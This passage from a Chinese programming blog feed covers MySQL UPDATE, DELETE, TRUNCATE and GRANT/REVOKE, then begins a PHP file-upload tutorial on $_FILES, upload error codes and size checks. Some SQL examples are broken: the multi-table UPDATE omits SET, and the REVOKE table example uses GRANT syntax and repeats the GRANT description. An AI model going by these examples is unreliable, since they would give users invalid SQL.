class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span> userid <span class="token operator">|</span>username<span class="token operator">|</span>  balance <span class="token operator">|</span>  <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span> <span class="token number">15</span>   <span class="token operator">|</span>王宝强    <span class="token operator">|</span> <span class="token number">14500.00</span> <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">1</span> row in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="red"><strong>同时对两个表进行更新</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">update 表1,表2 set 字段1=值1,字段2=值2,字段n=值n where 条件</td></tr><tr><td align="center">示例</td><td align="left">update money m,user u m.balance=m.balance*u.age where m.userid=u.id;</td></tr><tr><td align="center">示例说明</td><td align="left">修改money，将money表的别名设置为m；user表的别名设置为u；将m表的余额改为m表的<br>balance*用户表的age。执行条件是：m.userid = u.id</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> update money m<span class="token punctuation">,</span>user u m<span class="token punctuation">.</span>balance<span class="token operator">=</span>m<span class="token punctuation">.</span>balance<span class="token operator">*</span>u<span class="token punctuation">.</span>age where m<span class="token punctuation">.</span>userid<span class="token operator">=</span>u<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="十三-增删改查之删除记录"><font color="#FF6347" face="Comic sans MS">十三. 增删改查之删除记录</font><a href="post/MySQL-Primer#十三-增删改查之删除记录"></a></h3><p>使用关键词：<font color="#00B2EE"><strong>delete</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">DELETE FROM 表 [where 条件];</td></tr><tr><td align="center">示例</td><td align="left">DELETE FROM user where id &gt; 10;</td></tr><tr><td align="center">示例说明</td><td align="left">删除掉用户表中id大于10的所有用户</td></tr></tbody></table></div></div><p>&emsp;<br>user表，表结构如下：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">userid</th><th align="left">username</th><th align="left">balance</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">王宝强</td><td align="left">50000.00</td></tr><tr><td align="center">2</td><td align="left">胡歌</td><td align="left">150000000.00</td></tr><tr><td align="center">15</td><td align="left">马云</td><td align="left">15000.00</td></tr><tr><td align="center">16</td><td align="left">陈赫</td><td align="left">1234131.00</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> <span class="token constant">DELETE</span> <span class="token constant">FROM</span> user where id ＝ <span class="token number">1</span><span class="token punctuation">;</span> Query <span class="token constant">OK</span><span class="token punctuation">,</span> <span class="token number">1</span> row <span class="token function">affected</span> <span class="token punctuation">(</span><span class="token number">0.08</span> sec<span class="token punctuation">)</span>删除掉了id为<span class="token number">1</span>的，李文凯这一行的记录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="red"><strong>清空表记录</strong></font><br><font color="#FF7F00"><strong>delete</strong></font>和<font color="#FF7F00"><strong>truncate</strong></font>是一样的，但它们有一点不同，那就是DELETE可以返回被删除的记录数，而TRUNCATE TABLE返回的是0。<br>如果一个表中有自增字段，使用truncate table 这个自增字段将起始值恢复成1.</p><p><font color="#FF7F00"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">TRUNCATE TABLE 表名;</td></tr><tr><td align="center">示例</td><td align="left">TRUNCATE TABLE user;</td></tr><tr><td align="center">示例说明</td><td align="left">清空表的数据，并且让自增的id从1开始自增</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>切记：</strong></font><br><font color="#FF7F00">1.<strong>删除时一定要记住加上where条件，不然会清空掉整个表的记录。</strong><br>2.<strong>删除重要数据前一定要备份、备份、备份。</strong>     </font></p></blockquote><p>&emsp;<br>&emsp;</p><h3 id="十四-数据控制语言DCL"><font color="#FF6347" face="Comic sans MS">十四. 数据控制语言DCL</font><a href="post/MySQL-Primer#十四-数据控制语言DCL"></a></h3><p>创建库用户(注：可以针对一个用户增加多条权限。)</p><p><font color="#00B2EE"><strong>添加权限：</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">grant 权限 on 库.表 to ‘用户‘@’主机’ identified by ‘密码’;</td></tr><tr><td align="center">示例</td><td align="left">grant select, insert on test.* to ‘liwenkai’@’localhost’ identified by ‘4311’;</td></tr><tr><td align="center">示例说明</td><td align="left">给予liwenkai用户，在本机连接test库所有表的权限。操作的这些表具有查询和写入权限</td></tr></tbody></table></div></div><p>&emsp;<br><font color="#00B2EE"><strong>删除权限：</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">revoke 权限 on 库.表 from ‘用户‘@’主机’;</td></tr><tr><td align="center">示例</td><td align="left">revoke select, insert on test.* to ‘liwenkai’@’localhost’ identified by ‘4311’;</td></tr><tr><td align="center">示例说明</td><td align="left">给予liwenkai用户，在本机连接test库所有表的权限。操作的这些表具有查询和写入权限</td></tr></tbody></table></div></div><p>&emsp;<br><font color="#FF7F00"><strong>参数说明：</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">符号</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">grant all</td><td align="left">在grant后接all说明给予所有权限</td></tr><tr><td align="center">revoke all</td><td align="left">在revoke后接all说明删除所有权限</td></tr><tr><td align="center">权限 on .</td><td align="left">. 所明给予所有库所有表的操作权限</td></tr><tr><td align="center">‘用户‘@’主机’</td><td align="left">主机里面若为%。任意来源的主机均可以使用这个用户来访问</td></tr></tbody></table></div></div><blockquote><p>创建数据库用户liwenkai ，具有对test数据库中所有标的<strong>select / insert</strong> 权限</p></blockquote><p>&emsp;<br>示例：增加权限</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> grant select<span class="token punctuation">,</span> insert on test<span class="token punctuation">.</span><span class="token operator">*</span> to <span class="token string">'liwenkai'</span>@<span class="token string">'localhost'</span> identified by <span class="token string">'4311'</span><span class="token punctuation">;</span> Query <span class="token constant">OK</span><span class="token punctuation">,</span> <span class="token number">0</span> rows <span class="token function">affected</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>&emsp;<br>示例：移除权限</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> revoke insert on test<span class="token punctuation">.</span><span class="token operator">*</span> from <span class="token string">'liwenkai'</span>@<span class="token string">'localhost'</span><span class="token punctuation">;</span> Query <span class="token constant">OK</span><span class="token punctuation">,</span> <span class="token number">0</span> rows <span class="token function">affected</span> <span class="token punctuation">(</span><span class="token number">0.30</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><font color="#FF7F00"><strong>注：</strong></font><br>上面的一些语句用的较少。你可以将知识点的掌握级别设置为了解级别。<br>更多的时候，权限设置项特别多，人们往往记不住具体的命令。更多 的时候人们使用专门的工具来操作权限。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP语言 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-文件上传</title>
      <link href="/post/PHP-Upload/"/>
      <url>/post/PHP-Upload/</url>
      
        <content type="html"><![CDATA[<p>(。・∀・)ノ</p><a id="more"></a><p>&ensp;<br>&ensp;</p><center><font color="#00B2EE" face="Comic sans MS" size="5">PHP 文件上传</font></center><p>&emsp;<br>&emsp;</p><h3 id="一-修改php-ini文件"><font color="#FF6347" face="Comic sans MS">一. 修改php.ini文件</font><a href="post/PHP-Upload#一-修改php-ini文件"></a></h3><p>一般情况需要修改：[可以使用ctrl+f 搜索相关配置项。]</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">配置项</th><th align="left">功能说明</th></tr></thead><tbody><tr><td align="center">file_uploads</td><td align="left">on为开启文件上传功能，off为关闭</td></tr><tr><td align="center">post_max_size</td><td align="left">系统允许的POST传参的最大值</td></tr><tr><td align="center">upload_max_filesize</td><td align="left">系统允许的上传文件的最大值</td></tr><tr><td align="center">memory_limit</td><td align="left">内存使用限制</td></tr><tr><td align="center">max_execution_time</td><td align="left">(1)脚本执行时间,参数的单位为秒。<br>(2)这个参数是设定脚本的最大执行时间。<br>(3)也可以根据需求做适当的改变。通常不需要来修改，系统默认值即可。超大文件<br>上传的时候，可能会涉及到这一项参数的修改。<br>(4)上传时间太长了，会超时。如果你将此项参数设为0，则是不限制超时时间，不建<br>议使用。</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>建议尺寸：</strong></font> file_size(文件大小) &lt; upload_max_filesize &lt; post_max_size &lt; memory_limit</p></blockquote><p> &emsp;<br>&emsp;</p><h3 id="三-is-uploaded-file-函数、数组-FILES"><font color="#FF6347" face="Comic sans MS">三. is_uploaded_file()函数、数组$_FILES</font><a href="post/PHP-Upload#三-is-uploaded-file-函数、数组-FILES"></a></h3><h4 id="2-1-创建一个文件上传表单"><font color="#3CB371" face="Comic sans MS">2.1 创建一个文件上传表单</font><a href="post/PHP-Upload#2-1-创建一个文件上传表单"></a></h4><p>请看下面这个供上传文件的 HTML 表单：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Filename:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><blockquote><p><font color="#FF7F00"><strong>请留意如下有关此表单的信息：</strong></font></p><ol><li><strong>&lt;’&#39;form&gt; 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 <font color="#FF7F00">“multipart/form-data”</font>。</strong></li><li><strong>&lt;’&#39;input&gt; 标签的 <font color="#FF7F00">type=”file”</font> 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</strong></li></ol></blockquote><p>&emsp;</p><h4 id="2-2-is-uploaded-file-函数"><font color="#3CB371" face="Comic sans MS">2.2 is_uploaded_file() 函数</font><a href="post/PHP-Upload#2-2-is-uploaded-file-函数"></a></h4><p><font color="#00B2EE">[<a href="http://www.runoob.com/php/func-filesystem-is-uploaded-file.html" target="_blank" rel="noopener">PHP is_uploaded_file() 函数</a>]</font></p><blockquote><p><font color="#FF7F00"><strong>功能：</strong></font>检查指定的文件是否是通过 <strong>HTTP POST</strong> 上传的。如果文件是通过 HTTP POST 上传的，该函数返回 TRUE。</p></blockquote><p><strong>语法： is_uploaded_file(file)</strong></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">file</td><td align="left">必需。规定要检查的文件。</td></tr></tbody></table></div></div><p><strong>注意：</strong>该函数的结果会被缓存。请使用 <strong>clearstatcache()</strong> 来清除缓存。</p><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"test.txt"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"$file is uploaded via HTTP POST"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"$file is not uploaded via HTTP POST"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span>上面的代码将输出：test<span class="token punctuation">.</span>txt is not uploaded via <span class="token constant">HTTP</span> <span class="token constant">POST</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="2-3-FILES-数组"><font color="#3CB371" face="Comic sans MS">2.3  $_FILES 数组</font><a href="post/PHP-Upload#2-3-FILES-数组"></a></h4><p>当客户端上传文件后，我们在action=”xxxx.php”的xxxx.php页面就获得了一个<strong>$_FILES 数组 。</strong><br><font color="#FF7F00"><strong>$_FILES 数组内容如下:</strong> </font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">数组元素</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">$_FILES[“File”][“name”]</td><td align="left">上传文件的名称。</td></tr><tr><td align="center">$_FILES[“File”][“type”]</td><td align="left">文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。</td></tr><tr><td align="center">$_FILES[“File”][“size”]</td><td align="left">已上传文件的大小，单位为字节。</td></tr><tr><td align="center">$_FILES[“File’][“tmp_name”]</td><td align="left">文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在ph<br>p.ini的upload_tmp_dir 指定，但 用 putenv()函数设置是不起作用的。</td></tr><tr><td align="center">$_FILES[“File”][“error”]</td><td align="left">和该文件上传相关的错误代码。[“error”] 是在 PHP 4.2.0 版本中增加的。<br>下面是它的说明：(它们在PHP3.0以后成了常量或0123467)</td></tr></tbody></table></div></div><p>&emsp;<br><font color="#00B2EE"><strong>$_FILES数组结构：</strong></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//var_dump()或print_r()</span><span class="token comment" spellcheck="true">//打印变量的相关信息,将变量的信息详细的展示出来</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token delimiter">?></span>打印出来的结果的数组结构如下：<span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token string">'file'</span> <span class="token operator">=</span><span class="token operator">></span>        <span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//文件名</span>      <span class="token string">'name'</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'psu.jpg'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//文件的mime类型</span>      <span class="token string">'type'</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'image/jpeg'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>                          <span class="token comment" spellcheck="true">//缓存文件，上传的图片即保存在这里</span>      <span class="token string">'tmp_name'</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'E:\wamp\tmp\phpC32A.tmp'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//错误码，详见上面错误码介绍</span>      <span class="token string">'error'</span> <span class="token operator">=</span><span class="token operator">></span> int <span class="token number">0</span>                                                   <span class="token comment" spellcheck="true">//上传的文件大小</span>      <span class="token string">'size'</span> <span class="token operator">=</span><span class="token operator">></span> int <span class="token number">225824</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="2-4-move-uploaded-file-函数"><font color="#3CB371" face="Comic sans MS">2.4  move_uploaded_file() 函数</font><a href="post/PHP-Upload#2-4-move-uploaded-file-函数"></a></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_move_uploaded_file.asp" target="_blank" rel="noopener">PHP move_uploaded_file() 函数</a>]</font></p><blockquote><p><font color="#FF7F00"><strong>功能：</strong></font>将上传的文件移动到新位置，并命名。</p></blockquote><p><strong>bool</strong> <font color="#00B2EE"><strong>move_uploaded_file ( file, newloc)</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">file</td><td align="left">必需。规定要移动的文件。上传后的临时文件名，由系统自动生成。</td></tr><tr><td align="center">newloc</td><td align="left">必需。规定文件的新位置。包含有路径的新的文件名。</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li><strong>参数file一般为$_FILES[“File’][“tmp_name”]，</strong><font color="#FF7F00"><strong>是一个文件完整的临时路径和文件名；</strong></font></li><li><strong>参数newloc为新的路径，</strong><font color="#FF7F00"><strong>并且还要加上相应的重新命名文件的的格式。</strong></font></li><li><strong>本函数仅用于通过 HTTP POST 上传的文件。</strong></li><li>本函数检查并确保由 file 指定的文件<strong>是合法的上传文件</strong>（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</li><li><font color="#FF7F00"><strong>返回值：</strong></font>如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。<br>如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。<br>这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。</li><li>move_uploaded_file()基本上与函数<font color="#FF7F00">rename()</font>相同，<strong>但是它只能用于通过PHP的上传机制上传的文件</strong>。这是一项安全功能，可防止用户欺骗您的脚本，向他们显示与安全相关的数据。</li></ol></blockquote><p>&emsp;<br>&emsp;</p><h3 id="三-文件上传的步骤"><font color="#FF6347" face="Comic sans MS">三. 文件上传的步骤</font><a href="post/PHP-Upload#三-文件上传的步骤"></a></h3><h4 id="3-1-判断是否有错误码"><font color="#3CB371" face="Comic sans MS">3.1 判断是否有错误码</font><a href="post/PHP-Upload#3-1-判断是否有错误码"></a></h4><p>使用数组元素：<font color="red"><strong>$_FILES[‘file’][‘error’]</strong></font><br>即判断<font color="#FF7F00">$_FILES[‘file’][‘error’]返回值！！</font><br>注：错误码中没有5。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">错误码<br>对应常量</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">0<br>UPLOAD_ERR_OK</td><td align="left">无误，可以继续进行文件上传的后续操作。</td></tr><tr><td align="center">1<br>UPLOAD_ERR_INI_SIZE</td><td align="left">超出上传文件的最大限制，upload_max_filesize = 2M php.ini中设置，一<br>般默认为2M。可根据项目中的实际需要来修改</td></tr><tr><td align="center">2<br>UPLOAD_ERR_FORM_SIZE</td><td align="left">超出了指定的文件大小,根据项目的业务需求指定上传文件的大小限制</td></tr><tr><td align="center">3<br>UPLOAD_ERR_PARTIAL</td><td align="left">只有部分文件被上传</td></tr><tr><td align="center">4<br>UPLOAD_ERR_NO_FILE</td><td align="left">文件没有被上传</td></tr><tr><td align="center">6</td><td align="left">找不到临时文件夹，可能目录不存在或没权限</td></tr><tr><td align="center">7</td><td align="left">文件写入失败，可能磁盘满了或没有权限</td></tr></tbody></table></div></div><p>&emsp;<br>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//错误码不为0，即文件上传过程中出现了错误</span>       <span class="token keyword">case</span> <span class="token string">'1'</span><span class="token punctuation">:</span>           <span class="token keyword">echo</span> <span class="token string">'文件过大'</span><span class="token punctuation">;</span>           <span class="token keyword">break</span><span class="token punctuation">;</span>       <span class="token keyword">case</span> <span class="token string">'2'</span><span class="token punctuation">:</span>           <span class="token keyword">echo</span> <span class="token string">'文件超出指定大小'</span><span class="token punctuation">;</span>           <span class="token keyword">break</span><span class="token punctuation">;</span>       <span class="token keyword">case</span> <span class="token string">'3'</span><span class="token punctuation">:</span>           <span class="token keyword">echo</span> <span class="token string">'只有部分文件被上传'</span><span class="token punctuation">;</span>           <span class="token keyword">break</span><span class="token punctuation">;</span>       <span class="token keyword">case</span> <span class="token string">'4'</span><span class="token punctuation">:</span>           <span class="token keyword">echo</span> <span class="token string">'文件没有被上传'</span><span class="token punctuation">;</span>           <span class="token keyword">break</span><span class="token punctuation">;</span>       <span class="token keyword">case</span> <span class="token string">'6'</span><span class="token punctuation">:</span>           <span class="token keyword">echo</span> <span class="token string">'找不到指定文件夹'</span><span class="token punctuation">;</span>           <span class="token keyword">break</span><span class="token punctuation">;</span>       <span class="token keyword">case</span> <span class="token string">'7'</span><span class="token punctuation">:</span>           <span class="token keyword">echo</span> <span class="token string">'文件写入失败'</span><span class="token punctuation">;</span>           <span class="token keyword">break</span><span class="token punctuation">;</span>       <span class="token keyword">default</span><span class="token punctuation">:</span>           <span class="token keyword">echo</span> <span class="token string">"上传出错&lt;br/>"</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//错误码为0，即上传成功，可以进行后续处理，处理流程见下文</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="3-2-判断是否超出文件大小范围"><font color="#3CB371" face="Comic sans MS">3.2 判断是否超出文件大小范围</font><a href="post/PHP-Upload#3-2-判断是否超出文件大小范围"></a></h4><p>使用数组元素：<font color="red"><strong>$_FILES[“File’][“size”]</strong></font></p><p>&emsp;<br>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//判断错误</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//有错误可停止执行</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//当前上传文件无误，运行本段代码</span>    <span class="token comment" spellcheck="true">//判断文件是否超出了指定的大小</span>    <span class="token comment" spellcheck="true">//单位为byte</span>    <span class="token variable">$MAX_FILE_SIZE</span> <span class="token operator">=</span> <span class="token number">100000</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$MAX_FILE_SIZE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//判断，如果上传的文件，大小超出了我们给的限制范围，退上传并产生错误提示</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"文件超出指定大小"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>将我们指定的文件大小，定义为$MAX_FILE_SIZE，该变量的计数单位为byte，对应上传文件的 $_FILES[‘file’][‘size’]大小。<br>示例代码中，限制大小约为100K及以下的文件。</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="3-3-判断后缀名和mime类型是否符合"><font color="#3CB371" face="Comic sans MS">3.3 判断后缀名和mime类型是否符合</font><a href="post/PHP-Upload#3-3-判断后缀名和mime类型是否符合"></a></h4><p>使用数组元素：<font color="red"><strong>$_FILES[“File”][“type”]</strong></font></p><blockquote><ol><li><strong>MIME</strong>(Multipurpose Internet Mail Extensions)是多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</li><li>在判断后缀和MIME类型的时候，我们会<font color="#FF7F00">用到PHP的一个函数<strong>in_array()</strong></font>,该函数传入两个参数。<br>第一个参数是要判断的值；<br>第二个参数是范围数组。<br>我们用这个函数来判断文件的后缀名和mime类型是否在允许的范围内。</li></ol></blockquote><p>&emsp;<br>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*判断后缀名和MIME类型是否符合指定需求例如:当前项目指定上传后缀为.jpg或.gif的图片，则$allowSuffix = array('jpg','gif');*/</span><span class="token comment" 